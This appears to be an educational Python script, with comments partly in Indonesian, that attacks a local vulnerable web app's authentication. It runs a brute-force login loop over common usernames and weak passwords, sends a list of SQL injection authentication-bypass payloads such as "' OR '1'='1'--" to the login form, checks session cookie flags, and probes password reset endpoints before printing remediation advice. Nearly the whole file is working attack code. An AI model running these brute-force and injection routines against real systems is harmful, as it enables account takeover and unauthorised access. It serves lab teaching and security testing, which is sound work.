#!/usr/bin/env python3
"""
Broken Authentication Attack Testing Suite
Educational Purpose: Demonstrasi berbagai serangan pada aplikasi vulnerable
⚠️ HANYA UNTUK PEMBELAJARAN - JANGAN DIGUNAKAN UNTUK SERANGAN NYATA
"""

import requests
import time
import json
import itertools
from urllib.parse import urljoin

class BrokenAuthTester:
    def __init__(self, base_url="http://localhost:8081"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def print_banner(self):
        print("=" * 60)
        print("🔓 BROKEN AUTHENTICATION TESTING SUITE")
        print("📚 Educational Purpose - Cyber Security Learning")
        print("⚠️  WARNING: Only use on authorized systems!")
        print("=" * 60)
        print()

    def test_1_brute_force_attack(self):
        """
        VULNERABILITY: No Rate Limiting
        ATTACK: Brute Force Login Attack
        """
        print("🚨 TEST 1: BRUTE FORCE ATTACK")
        print("-" * 40)
        
        # Common username list
        usernames = ['admin', 'administrator', 'john', 'jane', 'bob', 'charlie', 'user', 'test']
        
        # Common password list (weak passwords)
        passwords = ['admin', 'password', '123456', 'qwerty', 'password123', 
                    'admin123', 'letmein', 'welcome', '12345', 'test']
        
        successful_logins = []
        attempt_count = 0
        
        print(f"🎯 Target: {self.base_url}")
        print(f"👥 Testing {len(usernames)} usernames")
        print(f"🔑 Testing {len(passwords)} passwords")
        print(f"⚡ Total combinations: {len(usernames) * len(passwords)}")
        print()
        
        start_time = time.time()
        
        for username in usernames:
            for password in passwords:
                attempt_count += 1
                
                # Tampilkan progress setiap 10 attempts
                if attempt_count % 10 == 0 or attempt_count == 1:
                    print(f"🔄 Attempt {attempt_count}: {username}:{password}")
                
                # Send login request
                login_data = {
                    'username': username,
                    'password': password
                }
                
                try:
                    response = self.session.post(
                        urljoin(self.base_url, '/index.php'),
                        data=login_data,
                        timeout=10
                    )
                    
                    # Check for successful login indicators
                    if "Login successful" in response.text or "Welcome" in response.text:
                        successful_logins.append({
                            'username': username,
                            'password': password,
                            'attempt': attempt_count
                        })
                        print(f"✅ SUCCESS! {username}:{password}")
                    
                    # Small delay to avoid overwhelming the server
                    time.sleep(0.1)
                    
                except requests.exceptions.RequestException as e:
                    print(f"❌ Error testing {username}:{password} - {e}")
                    continue
        
        end_time = time.time()
        
        print("\n" + "=" * 50)
        print("📊 BRUTE FORCE ATTACK RESULTS")
        print("=" * 50)
        print(f"⏱️  Total time: {end_time - start_time:.2f} seconds")
        print(f"🔢 Total attempts: {attempt_count}")
        print(f"✅ Successful logins: {len(successful_logins)}")
        
        if successful_logins:
            print("\n🎯 COMPROMISED ACCOUNTS:")
            for login in successful_logins:
                print(f"   👤 {login['username']}:{login['password']} (attempt #{login['attempt']})")
        else:
            print("\n❌ No successful logins found")
        
        print(f"\n⚠️  VULNERABILITY IDENTIFIED:")
        print("   • No rate limiting implemented")
        print("   • No account lockout after failed attempts")
        print("   • Weak password policy allows common passwords")
        print()
        
        return successful_logins

    def test_2_session_hijacking(self):
        """
        VULNERABILITY: Insecure Session Management
        ATTACK: Session Cookie Manipulation
        """
        print("🚨 TEST 2: SESSION HIJACKING")
        print("-" * 40)
        
        # Get initial session
        response = self.session.get(self.base_url)
        
        if 'Set-Cookie' in response.headers:
            cookies = response.cookies
            session_id = cookies.get('PHPSESSID')
            
            print(f"🍪 Initial Session ID: {session_id}")
            
            # Check cookie security flags
            cookie_header = response.headers.get('Set-Cookie', '')
            
            vulnerabilities = []
            if 'HttpOnly' not in cookie_header:
                vulnerabilities.append("❌ HttpOnly flag missing - vulnerable to XSS")
            if 'Secure' not in cookie_header:
                vulnerabilities.append("❌ Secure flag missing - vulnerable over HTTP")
            if 'SameSite' not in cookie_header:
                vulnerabilities.append("❌ SameSite flag missing - vulnerable to CSRF")
            
            print("\n🔍 Cookie Security Analysis:")
            for vuln in vulnerabilities:
                print(f"   {vuln}")
            
            # Test session prediction
            print("\n🎲 Session ID Predictability Test:")
            session_ids = []
            
            for i in range(5):
                resp = requests.get(self.base_url)
                if resp.cookies.get('PHPSESSID'):
                    session_ids.append(resp.cookies.get('PHPSESSID'))
                    print(f"   Session {i+1}: {resp.cookies.get('PHPSESSID')}")
                time.sleep(0.5)
            
            # Basic pattern analysis
            if len(set(session_ids)) == len(session_ids):
                print("✅ Sessions appear to be unique")
            else:
                print("⚠️  Duplicate sessions detected!")
            
            return {
                'session_id': session_id,
                'vulnerabilities': vulnerabilities,
                'sample_sessions': session_ids
            }
        
        return None

    def test_3_sql_injection(self):
        """
        VULNERABILITY: Potential SQL Injection
        ATTACK: Authentication Bypass via SQL Injection
        """
        print("🚨 TEST 3: SQL INJECTION TESTING")
        print("-" * 40)
        
        # Common SQL injection payloads for authentication bypass
        sql_payloads = [
            "admin'--",
            "admin'/*",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin' OR '1'='1'--",
            "') OR ('1'='1'--",
            "' OR 1=1#",
            "admin' OR 1=1#",
            "' UNION SELECT 1,'admin','password',1--"
        ]
        
        print(f"🎯 Testing {len(sql_payloads)} SQL injection payloads")
        print()
        
        successful_injections = []
        
        for i, payload in enumerate(sql_payloads, 1):
            print(f"🔍 Testing payload {i}: {payload[:30]}...")
            
            # Test with SQL injection in username field
            login_data = {
                'username': payload,
                'password': 'any_password'
            }
            
            try:
                response = self.session.post(
                    urljoin(self.base_url, '/index.php'),
                    data=login_data,
                    timeout=10
                )
                
                # Check for SQL errors or successful bypass
                if any(error in response.text.lower() for error in ['mysql', 'sql', 'database', 'error']):
                    print(f"⚠️  SQL Error detected with payload: {payload}")
                    successful_injections.append({
                        'payload': payload,
                        'type': 'SQL Error',
                        'response_snippet': response.text[:200]
                    })
                elif "Login successful" in response.text or "Welcome" in response.text:
                    print(f"✅ Potential bypass with payload: {payload}")
                    successful_injections.append({
                        'payload': payload,
                        'type': 'Authentication Bypass',
                        'response_snippet': response.text[:200]
                    })
                
                time.sleep(0.2)
                
            except requests.exceptions.RequestException as e:
                print(f"❌ Error testing payload: {e}")
                continue
        
        print("\n" + "=" * 50)
        print("📊 SQL INJECTION TEST RESULTS")
        print("=" * 50)
        
        if successful_injections:
            print(f"⚠️  {len(successful_injections)} potential vulnerabilities found:")
            for inj in successful_injections:
                print(f"   • {inj['type']}: {inj['payload']}")
        else:
            print("✅ No obvious SQL injection vulnerabilities detected")
            print("   (Note: This doesn't guarantee the app is secure)")
        
        return successful_injections

    def test_4_password_reset_vulnerability(self):
        """
        VULNERABILITY: Predictable Password Reset Tokens
        ATTACK: Password Reset Token Prediction
        """
        print("🚨 TEST 4: PASSWORD RESET VULNERABILITY")
        print("-" * 40)
        
        test_username = "admin"
        
        print(f"🎯 Testing password reset for username: {test_username}")
        
        # Generate multiple password reset requests
        reset_data = {'username': test_username}
        
        try:
            response = self.session.post(
                urljoin(self.base_url, '/forgot-password.php'),
                data=reset_data,
                timeout=10
            )
            
            print(f"📧 Password reset response status: {response.status_code}")
            
            # Look for token in response or URL
            if "token" in response.text.lower():
                print("⚠️  Reset token might be exposed in response")
            
            # Check if reset endpoint exists and is accessible
            reset_endpoints = [
                '/forgot-password.php',
                '/reset-password.php',
                '/password-reset.php'
            ]
            
            for endpoint in reset_endpoints:
                try:
                    resp = requests.get(urljoin(self.base_url, endpoint), timeout=5)
                    if resp.status_code == 200:
                        print(f"✅ Reset endpoint accessible: {endpoint}")
                except:
                    continue
            
        except requests.exceptions.RequestException as e:
            print(f"❌ Error testing password reset: {e}")
        
        return {'tested': True, 'username': test_username}

    def generate_attack_report(self, results):
        """Generate comprehensive attack report"""
        print("\n" + "=" * 60)
        print("📋 COMPREHENSIVE VULNERABILITY ASSESSMENT REPORT")
        print("=" * 60)
        
        total_vulnerabilities = 0
        
        # Brute Force Results
        if 'brute_force' in results and results['brute_force']:
            total_vulnerabilities += 3
            print("\n🔴 HIGH RISK: Brute Force Vulnerabilities")
            print("   • No rate limiting on login attempts")
            print("   • No account lockout mechanism")
            print("   • Weak password policy")
            print(f"   • {len(results['brute_force'])} accounts compromised")
        
        # Session Security Results
        if 'session' in results and results['session']:
            vuln_count = len(results['session']['vulnerabilities'])
            total_vulnerabilities += vuln_count
            if vuln_count > 0:
                print(f"\n🟡 MEDIUM RISK: Session Management ({vuln_count} issues)")
                for vuln in results['session']['vulnerabilities']:
                    print(f"   • {vuln}")
        
        # SQL Injection Results
        if 'sql_injection' in results and results['sql_injection']:
            total_vulnerabilities += len(results['sql_injection'])
            print(f"\n🔴 HIGH RISK: SQL Injection ({len(results['sql_injection'])} findings)")
            for inj in results['sql_injection']:
                print(f"   • {inj['type']}: {inj['payload']}")
        
        print(f"\n📊 SUMMARY:")
        print(f"   Total vulnerabilities found: {total_vulnerabilities}")
        print(f"   Risk level: {'🔴 HIGH' if total_vulnerabilities > 5 else '🟡 MEDIUM' if total_vulnerabilities > 2 else '🟢 LOW'}")
        
        print(f"\n💡 REMEDIATION RECOMMENDATIONS:")
        print("   1. Implement rate limiting on login attempts")
        print("   2. Add account lockout after failed login attempts")
        print("   3. Enforce strong password policy")
        print("   4. Set secure cookie flags (HttpOnly, Secure, SameSite)")
        print("   5. Use prepared statements to prevent SQL injection")
        print("   6. Implement session regeneration after login")
        print("   7. Use cryptographically secure session ID generation")
        print("   8. Add proper input validation and sanitization")
        
        print("\n⚠️  DISCLAIMER: This testing was performed for educational purposes only.")
        print("=" * 60)

def main():
    tester = BrokenAuthTester()
    tester.print_banner()
    
    results = {}
    
    try:
        # Test 1: Brute Force Attack
        results['brute_force'] = tester.test_1_brute_force_attack()
        
        print("\n" + "⏸️ " * 20)
        input("Press Enter to continue to Session Hijacking test...")
        
        # Test 2: Session Hijacking
        results['session'] = tester.test_2_session_hijacking()
        
        print("\n" + "⏸️ " * 20)
        input("Press Enter to continue to SQL Injection test...")
        
        # Test 3: SQL Injection
        results['sql_injection'] = tester.test_3_sql_injection()
        
        print("\n" + "⏸️ " * 20)
        input("Press Enter to continue to Password Reset test...")
        
        # Test 4: Password Reset Vulnerability
        results['password_reset'] = tester.test_4_password_reset_vulnerability()
        
        # Generate comprehensive report
        tester.generate_attack_report(results)
        
    except KeyboardInterrupt:
        print("\n\n⏹️  Testing interrupted by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")

if __name__ == "__main__":
    main()